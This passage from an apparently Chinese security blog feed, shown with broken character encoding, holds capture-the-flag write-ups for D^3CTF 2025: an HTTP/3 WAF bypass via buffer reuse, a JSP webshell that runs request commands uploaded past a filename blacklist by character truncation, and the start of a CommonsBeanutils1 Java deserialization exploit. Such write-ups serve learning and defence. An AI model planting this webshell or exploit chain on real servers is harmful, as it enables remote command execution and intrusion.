å®ä¾‹ï¼ŒåŒ…è£…ç»™å®šçš„ io.ReadCloser</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">textInterrupterWrap</span><span class="params">(rc io.ReadCloser)</span></span> io.ReadCloser &#123;</span><br><span class="line"><span class="keyword">return</span> &amp;wrap&#123; <span class="comment">// è¿”å›ä¸€ä¸ª wrap ç»“æ„ä½“å®ä¾‹çš„æŒ‡é’ˆ</span></span><br><span class="line">rc,         <span class="comment">// åµŒå…¥åŸå§‹çš„ io.ReadCloser</span></span><br><span class="line">[]<span class="type">byte</span>(<span class="string">&quot;flag&quot;</span>), <span class="comment">// è®¾ç½®ç¦æ­¢çš„å­—èŠ‚åºåˆ—ä¸º &quot;flag&quot;</span></span><br><span class="line"><span class="number">0</span>,          <span class="comment">// åˆå§‹åŒ¹é…ç´¢å¼•ä¸º 0</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¢³ç†ä¸€ä¸‹è¿è¡Œæµç¨‹<br>è¿è¡Œç¨‹åºæ‰§è¡Œ<code>main</code>å‡½æ•°<br>ç„¶åå¯åŠ¨ä¸¤ä¸ªæœåŠ¡å™¨ï¼Œåˆ†åˆ«æ˜¯<code>http</code>å’Œ<code>http3</code>çš„åè®®<br>è¿™ä¸¤ä¸ªæœåŠ¡æ˜¯åŒæ—¶è¿è¡Œçš„</p><p>ä¸¤ä¸ªæœåŠ¡çš„å¤„ç†é€»è¾‘éƒ½æ˜¯muxï¼ˆè‡ªå®šä¹‰çš„å¤šè·¯å¤ç”¨å™¨ï¼‰</p><p>æ¥æ”¶åˆ°è¯·æ±‚æ—¶ï¼Œ<br>å¦‚æœæ˜¯GETè¯·æ±‚ï¼Œå°±è¿”å›ä¸€å¥æ¬¢è¿ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello D^3CTF 2025,I&#x27;m tidy quic in web.</span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯POSTè¯·æ±‚ï¼Œå°±æ ¹æ®<code>Content-Length</code><br>è·å–å¯¹åº”é•¿åº¦çš„è¯·æ±‚ä½“ï¼Œå­˜åœ¨<code>buf</code>é‡Œ</p><p>å¦‚æœbufä»¥<code>I want</code>å¼€å¤´<br>ä¸”å‰©ä½™çš„å†…å®¹å»é™¤å‰åçš„ç©ºç™½åä¸º<code>flag</code><br>å°±å¯ä»¥è·å–åˆ°è¿”å›åˆ°çš„flag</p><p>å…³é”®çš„ç‰¹æ€§åœ¨è¿™ä¸ªåœ°æ–¹ï¼š</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// å¦‚æœ Content-Length å·²çŸ¥</span></span><br><span class="line">buf = p.Get(length)     <span class="comment">// ä»ç¼“å†²åŒºæ± ä¸­è·å–ä¸€ä¸ªæŒ‡å®šé•¿åº¦çš„å­—èŠ‚åˆ‡ç‰‡</span></span><br><span class="line"><span class="keyword">defer</span> p.Put(buf)        <span class="comment">// åœ¨å‡½æ•°è¿”å›å‰å°†ç¼“å†²åŒºæ”¾å›æ± ä¸­ï¼Œé¿å…å†…å­˜æ³„æ¼</span></span><br><span class="line">    rd := textInterrupterWrap(r.Body) <span class="comment">// åŒ…è£…è¯·æ±‚ä½“ï¼Œä»¥ä¾¿è¿›è¡Œå†…å®¹æ£€æŸ¥</span></span><br></pre></td></tr></table></figure><p>è™½ç„¶<code>p.Put</code>å½’è¿˜äº†ç¼“å†²åŒºï¼Œä½¿å…¶å¯ç”¨<br>ä½†æ˜¯å¹¶ä¸ä¼šåˆ é™¤å®ƒçš„æ•°æ®<br>è€Œwafæ£€æŸ¥çš„ä¸æ˜¯<code>buf</code>è€Œæ˜¯è¯·æ±‚ä½“æœ¬èº«<code>r.Body</code></p><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å‘ä¸€æ¬¡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\20889&gt;C:\Users\20889\scoop\shims\curl.exe -k --http3 https://35.241.98.126:31547/ -X POST -H &quot;Content-Length: 10&quot; -H &quot;Connection: keep-alive&quot; -d &quot;I wantflag&quot;</span><br><span class="line">WAF</span><br></pre></td></tr></table></figure><p>è¢«wafï¼Œä½†æ˜¯æ­¤æ—¶æ•°æ®è¿˜å­˜åœ¨bufé‡Œ<br>è¿™ä¸ªå†…ç½®æœºåˆ¶ä¼¼ä¹ä¼šè¿‡ä¸€å°æ®µæ—¶é—´è‡ªåŠ¨é‡Šæ”¾<br>æ‰€ä»¥åªè¦å¿«é€Ÿå‘å‡ºä¸‹ä¸€æ¡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\20889&gt;C:\Users\20889\scoop\shims\curl.exe -k --http3 https://35.241.98.126:31547/ -X POST -H &quot;Content-Length: 10&quot; -H &quot;Connection: keep-alive&quot; -d &quot;&quot;</span><br><span class="line">d3ctf&#123;Y0u-S@iD_RlghT_6Ut-YOu_SHoULD-P1ay_GeNshln-iMp@ct1&#125;</span><br></pre></td></tr></table></figure><p>å°±èƒ½æ‹¿åˆ°flagäº†<br>ä½†è¿™é‡Œç¬¬äºŒæ¬¡å‘é€æ—¶è¦æ³¨æ„ä¸è¦è¦†ç›–æ‰åŸæœ‰çš„ç»“æœ<br>å³<code>I want flag</code><br>è¿™ä¸ªç»“æ„ï¼Œæ‰€ä»¥ç”¨ç©ºå­—ç¬¦ä¸²æœ€å¥½</p><h3 id="jtar"><a href="#jtar" class="headerlink" title="jtar"></a>jtar</h3><p>çœ‹åˆ°æ˜¯javaé¢˜å·²ç»ç•æƒ§äº†<br>ä½†è¿˜æ˜¯åªèƒ½çŸ¥è¯†å­¦çˆ†</p><p>é¦–å…ˆå­¦ç€å†™ä¸€ä¸ªjspé©¬</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">JSPï¼ˆJava Server Pagesï¼‰æ˜¯ä¸€ç§ç”¨äºå¼€å‘åŠ¨æ€ç½‘é¡µçš„æŠ€æœ¯ï¼Œ</span><br><span class="line">å®ƒå…è®¸å¼€å‘è€…å°†Javaä»£ç åµŒå…¥åˆ°HTMLé¡µé¢ä¸­ã€‚</span><br><span class="line">JSPæ˜¯åŸºäºJava ServletæŠ€æœ¯çš„æ‰©å±•ï¼Œ</span><br><span class="line">ä¸»è¦ç”¨äºç®€åŒ–é¡µé¢å†…å®¹çš„åŠ¨æ€ç”Ÿæˆã€‚</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘å°±æŠŠå®ƒç†è§£æˆphp</p><p>è¯­æ³•ä¼¼ä¹å°±æ˜¯ä½¿ç”¨<code>&lt;%%&gt;</code>åŒ…è£¹<br>ç„¶åå†…éƒ¨å†™<code>java</code>è¯­æ³•</p><p>è¿™é“é¢˜ä¼¼ä¹æ²¡æœ‰å¯¹å†…å®¹è¿›è¡Œè¿‡æ»¤ï¼Œ<br>æ‰€ä»¥æŠ„ä¸€ä¸ªæœ€æ™®é€šçš„æœ‰å›æ˜¾æœ¨é©¬ï¼š</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ä¸€å¥è¯æœ¨é©¬&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  <span class="keyword">if</span> (<span class="string">&quot;password&quot;</span>.equals(request.getParameter(<span class="string">&quot;p&quot;</span>)))&#123;</span><br><span class="line">  <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream));</span><br><span class="line">    String line;</span><br><span class="line">    <span class="keyword">while</span> ((line = bufferedReader.readLine())!=<span class="literal">null</span>)&#123;</span><br><span class="line">        response.getWriter().print(line);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæ¥å…·ä½“çœ‹ä¸€ä¸‹è¿™é“é¢˜çš„æºç </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> d3.example.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> d3.example.utils.BackUp;</span><br><span class="line"><span class="keyword">import</span> d3.example.utils.Upload;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Objects;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.multipart.MultipartFile;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainController</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MainController</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&#123;&quot;/view&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">view</span><span class="params">(<span class="meta">@RequestParam</span> String page, HttpServletRequest request)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (page.matches(<span class="string">&quot;^[a-zA-Z0-9-]+$&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">viewPath</span> <span class="operator">=</span> <span class="string">&quot;/WEB-INF/views/&quot;</span> + page + <span class="string">&quot;.jsp&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">realPath</span> <span class="operator">=</span> request.getServletContext().getRealPath(viewPath);</span><br><span class="line">            <span class="type">File</span> <span class="variable">jspFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(realPath);</span><br><span class="line">            <span class="keyword">if</span> (realPath != <span class="literal">null</span> &amp;&amp; jspFile.exists()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>(page);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ModelAndView</span> <span class="variable">mav</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">        mav.addObject(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;The file don&#x27;t exist.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> mav;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/Upload&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">UploadController</span><span class="params">(<span class="meta">@RequestParam</span> MultipartFile file)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">uploadDir</span> <span class="operator">=</span> <span class="string">&quot;webapps/ROOT/WEB-INF/views&quot;</span>;</span><br><span class="line">            Set&lt;String&gt; blackList = <span class="keyword">new</span> <span class="title class_">HashSet</span>(Arrays.asList(<span class="string">&quot;jsp&quot;</span>, <span class="string">&quot;jspx&quot;</span>, <span class="string">&quot;jspf&quot;</span>, <span class="string">&quot;jspa&quot;</span>, <span class="string">&quot;jsw&quot;</span>, <span class="string">&quot;jsv&quot;</span>, <span class="string">&quot;jtml&quot;</span>, <span class="string">&quot;jhtml&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="string">&quot;xml&quot;</span>, <span class="string">&quot;war&quot;</span>, <span class="string">&quot;jar&quot;</span>));</span><br><span class="line">            <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> Upload.secureUpload(file, uploadDir, blackList);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Upload Success: &quot;</span> + filePath;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Upload.UploadException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;The file is forbidden: &quot;</span> + e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/BackUp&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">BackUpController</span><span class="params">(<span class="meta">@RequestParam</span> String op)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (Objects.equals(op, <span class="string">&quot;tar&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                BackUp.tarDirectory(Paths.get(<span class="string">&quot;backup.tar&quot;</span>), Paths.get(<span class="string">&quot;webapps/ROOT/WEB-INF/views&quot;</span>));</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Success !&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var3) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Failure : tar Error&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Objects.equals(op, <span class="string">&quot;untar&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                BackUp.untar(Paths.get(<span class="string">&quot;webapps/ROOT/WEB-INF/views&quot;</span>), Paths.get(<span class="string">&quot;backup.tar&quot;</span>));</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Success !&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var4) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Failure : untar Error&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Failure : option Error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸‰ä¸ªæ¥å£</p><ul><li>View</li></ul><p>æ¥æ”¶ä¸€ä¸ª<code>page</code>å‚æ•°<br>ç„¶åä¼šè¿”å›å¯¹åº”çš„<code>views/&lt;page&gt;.jsp</code>æ–‡ä»¶</p><ul><li>Upload</li></ul><p>ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶<br>è¿‡æ»¤äº†æœ‰å¯èƒ½è¢«å½“åšjspè§£æçš„æ‰€æœ‰æ–‡ä»¶</p><ul><li>BackUp</li></ul><p>æ¥æ”¶ä¸€ä¸ª<code>op</code>å‚æ•°ï¼ˆæ“ä½œï¼‰<br>å¦‚æœå€¼ä¸º<code>tar</code><br>å°±æŠŠviewsç›®å½•æ‰“åŒ…ä¸ºä¸€ä¸ª<code>backup.tar</code><br>å¦‚æœå€¼ä¸º<code>untar</code><br>å°±æŠŠè¿™ä¸ªå‹ç¼©åŒ…é‡æ–°è§£å‹åˆ°viewsé‡Œ</p><p>é‚£ä¹ˆç°åœ¨çœ‹æ¥æ€è·¯å…¶å®æŒºæ¸…æ™°çš„ï¼Œ<br>ç”¨åä¸¤ä¸ªæ¥å£æƒ³åŠæ³•ä¼ ä¸€ä¸ªjspé©¬åˆ°viewsç›®å½•é‡Œ<br>ç„¶åé€šè¿‡Viewæ¥å£å»è®¿é—®</p><p>çœ‹äº†å¾ˆå¤šwpè¯´å› ä¸ºé¢˜ç›®å«jtaræ‰€ä»¥é—®é¢˜è‚¯å®šåœ¨è¿™ä¸ªè§£å‹æ“ä½œé‡Œ<br>å…¶å®è¿™ä¸ªæˆ‘è§‰å¾—ä¸ä¸€å®šçš„ï¼Œåªæ˜¯ç½‘ç«™ä¸»è¦æ˜¯è¿™ä¸ªåŠŸèƒ½è€Œå·²<br>ä½†æ˜¯è¿™é“é¢˜ç¡®å®æ˜¯</p><p>åˆ°äº†è¿™é‡Œåˆå­¦åˆ°ä¸ªæ–°ç‰¹æ€§ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javaä¸­charçš„â¼¤â¼©åœ¨\u0000-\uffffä¹‹é—´ï¼Œ</span><br><span class="line">â½½byteçš„â¼¤â¼©åœ¨(-127)-128ä¹‹é—´ï¼Œæ‰€ä»¥å½“charçš„å€¼åœ¨257æ—¶ï¼Œ</span><br><span class="line">è¢«å¼ºåˆ¶è½¬æ¢æˆbyteï¼Œåˆ™ä¼šå˜æˆ1ï¼Œå³asciiç ä¸º1å¯¹åº”çš„å­—ç¬¦</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å› ä¸º Java ä¸­ char çš„å¤§å°æ˜¯ 2 å­—èŠ‚ï¼Œ</span><br><span class="line">èŒƒå›´æ˜¯ 0 ~ 65515ï¼ˆ\u0000 ï½ \uffffï¼‰ï¼Œ</span><br><span class="line">è€Œ byte æ˜¯ 1 å­—èŠ‚ï¼ŒèŒƒå›´æ˜¯ -128 ~ 127ï¼Œ</span><br><span class="line">æ‰€ä»¥å¦‚æœ char è¶…è¿‡äº† 256ï¼Œå°±ä¼šå‘ç”Ÿæ•°æ®æˆªæ–­ï¼Œå³åªä¿ç•™ä½ 8 ä½</span><br><span class="line"></span><br><span class="line">æ‰€ä»¥å°±æƒ³æ‰¾åˆ°ä¸€ä¸ªå­—ç¬¦åœ¨è½¬æ¢åå˜æˆ jã€sã€p ä¸­çš„ä¸€ä¸ªå­—ç¬¦</span><br><span class="line">æ¯”å¦‚ j äºŒè¿›åˆ¶è¡¨ç¤ºæ˜¯ 00000000 01101010ï¼Œ</span><br><span class="line">è€ƒè™‘åŠ ä¸Šä¸€ä¸ªæ•°ï¼Œä½¿å…¶ä½å…«ä½ä¸å˜ï¼Œåªæ”¹å˜é«˜å…«ä½</span><br><span class="line"></span><br><span class="line">å³åŠ ä¸Šè¶…è¿‡ 8 ä½çš„æ•°å­—ï¼ˆä½å…«ä½å…¨ä¸º 0ï¼‰ã€‚</span><br><span class="line">æ¯”å¦‚ 00000001 00000000ï¼Œåè¿›åˆ¶ä¸º 256ã€‚</span><br><span class="line">ç›¸åŠ åä¸º 00000001 01101010ã€‚æˆªæ–­åï¼Œ</span><br><span class="line">å°±æ˜¯ 01101010 å³å­—ç¬¦ â€œjâ€ äº†</span><br></pre></td></tr></table></figure><p>è€Œjtarè·å–æ–‡ä»¶åçš„å®ç°æ˜¯é€šè¿‡è¿™ä¹ˆä¸€ä¸ªå‡½æ•°</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getNameBytes</span><span class="params">(StringBuffer name, <span class="type">byte</span>[] buf, <span class="type">int</span> offset, <span class="type">int</span> length)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length &amp;&amp; i &lt; name.length(); ++i) &#123;</span><br><span class="line">    buf[offset + i] = (<span class="type">byte</span>) name.charAt(i);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (; i &lt; length; ++i) &#123;</span><br><span class="line">    buf[offset + i] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> offset + length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°±å‘ç”Ÿäº†ä¸Šè¿°éœ€è¦çš„å¼ºåˆ¶ç±»å‹è½¬æ¢</p><p>é‚£ä¹ˆåªè¦ä½¿ç”¨pythonæ‰¾åˆ°jspå¯¹åº”çš„åŠ 256ä½çš„å­—ç¬¦å³å¯<br>ä¸è¿‡è¿™é“é¢˜åªéœ€è¦æ¢ä¸€ä¸ª</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chr(256+ord(&#x27;j&#x27;)) -&gt; Åª</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯<code>Åªsp</code><br>é‚£ä¹ˆå°±ä¼ ä¸€ä¸ª<code>Åªsp</code>é©¬<br>ç„¶åæ‰“åŒ…å†è§£åŒ…<br>æœ€åä¸Šé©¬å³å¯<br>flagåœ¨envé‡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">d3ctf&#123;wh4T_?1_H0W-couID_YoU-D0-thAt_,-JTAr-?3d7c8d&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> write_up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaé“¾å­åˆ†æâ€”CommonsBeanutils1</title>
      <link href="/2025/05/10/java-cb1/"/>
      <url>/2025/05/10/java-cb1/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¸æ˜¯ccb</span><br><span class="line">æ˜¯CommonsBeanutils</span><br></pre></td></tr></table></figure><p>ä¸Šä¸€ç¯‡å­¦ä¹ äº†CC2ä¸­çš„<code>java.util.PriorityQueue</code><br>è¿™ä¸ªç±»ä¼šè¿›è¡Œé‡æ’åºæ“ä½œè§¦å‘æ¯”è¾ƒ<br>CB1é“¾å­çš„å‡ºç°æ˜¯ä¸ºäº†æ‰¾åˆ°å¦ä¸€ä¸ªèƒ½å¤Ÿåˆ©ç”¨çš„æ¯”è¾ƒå™¨ï¼ˆé™¤è§¦å‘ç¿»è¯‘é“¾å¤–ï¼‰</p><h3 id="JavaBean"><a href="#JavaBean" class="headerlink" title="JavaBean"></a>JavaBean</h3><p>å±æ€§çš„å°è£…å®Œå…¨ç¬¦åˆæ ‡å‡†çš„ç±»å«<code>JavaBean</code><br>ä¾‹å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="built_in">this</span>.name; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123; <span class="built_in">this</span>.name = name; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="built_in">this</span>.age; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123; <span class="built_in">this</span>.age = age; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isChild</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age &lt;= <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CommonsBeanutils"><a href="#CommonsBeanutils" class="headerlink" title="CommonsBeanutils"></a>CommonsBeanutils</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Commons Beanutils æ˜¯ Apache Commons å·¥å…·é›†ä¸‹çš„å¦ä¸€ä¸ªé¡¹ç›®ï¼Œå®ƒæä¾›äº†å¯¹æ™®é€šJavaç±»å¯¹</span><br><span class="line">è±¡ï¼ˆä¹Ÿç§°ä¸ºJavaBeanï¼‰çš„ä¸€äº›æ“ä½œæ–¹æ³•ã€‚</span><br></pre></td></tr></table></figure><p>åœ¨<code>commons-beanutils</code>ä¸­æä¾›äº†ä¸€ä¸ªé™æ€æ–¹æ³•<code>PropertyUtils.getProperty</code>ï¼Œ<br>è®©ä½¿ç”¨è€…å¯ä»¥ç›´æ¥è°ƒç”¨ä»»æ„<code>JavaBean</code>çš„<code>getter</code>æ–¹æ³•ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PropertyUtils.getProperty(<span class="keyword">new</span> <span class="title class_">Person</span>(), <span class="string">&quot;name&quot;</span>);</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œ<code>commons-beanutils</code>ä¼šè‡ªåŠ¨æ‰¾åˆ°<code>name</code>å±æ€§çš„<code>getter</code>æ–¹æ³•ï¼Œ<br>ä¹Ÿå°±æ˜¯<code>getName</code>ï¼Œç„¶åè°ƒç”¨ï¼Œè·å¾—è¿”å›å€¼ã€‚</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsBeanutils1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object</span></span><br><span class="line"><span class="params">            value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(org.example.evil.EvilTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> 